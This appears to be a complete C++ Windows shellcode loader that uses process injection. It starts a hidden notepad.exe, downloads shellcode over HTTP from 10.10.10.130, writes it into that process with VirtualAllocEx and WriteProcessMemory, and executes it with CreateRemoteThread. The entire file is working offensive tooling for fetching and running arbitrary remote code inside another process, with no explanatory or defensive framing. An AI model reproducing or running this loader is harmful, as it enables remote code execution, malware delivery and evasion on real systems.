#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"10.10.10.130\0", L"/shellcode.bin\0");

    // allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten);

    // create remote thread
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        process_info->hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId);

    // close handles
    CloseHandle(hThread);
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_ASYNC);          // disable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_PORT,            // port 80
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_REFRESH);

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
